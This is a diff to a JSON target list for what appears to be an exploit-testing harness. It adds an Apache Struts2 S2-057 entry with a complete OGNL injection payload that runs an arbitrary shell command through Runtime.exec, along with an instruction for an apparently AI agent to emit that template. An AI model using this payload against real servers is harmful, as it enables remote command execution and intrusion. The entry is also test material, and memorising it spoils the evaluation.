@@ -83,5 +83,21 @@
     "seed_method": "POST",
     "seed_body": "{\"title\":\"test\",\"content\":\"hello\"}",
     "seed_content_type": "application/json"
+  },
+  {
+    "id": "struts2-s2057",
+    "name": "Struts2 S2-057 OGNL URI Namespace Injection",
+    "compose_path": "struts2/s2-057",
+    "port": 8080,
+    "url": "http://127.0.0.1:8080/struts2-showcase/{PAYLOAD}/actionChain1.action",
+    "method": "GET",
+    "parameter_name": null,
+    "injection_point": "URI_PATH",
+    "vulnerability_type": "COMMAND_INJECTION",
+    "target_description": "Framework: Apache Struts2 2.3.34 (S2-057). Vulnerability: OGNL injection through the URL namespace path. The server evaluates OGNL expressions placed between slashes in the URL. Use {CMD} as the shell command placeholder. Use this exact template, replacing {CMD} with the command to run:\n\n${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('{CMD}')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}\n\nThe {CMD} placeholder must appear exactly once, inside the exec() call. Emit this template as candidate_payload; the oracle will embed it in the request path.",
+    "language": "java",
+    "in_band": true,
+    "type": "docker",
+    "boot_wait_seconds": 20
   }
 ]
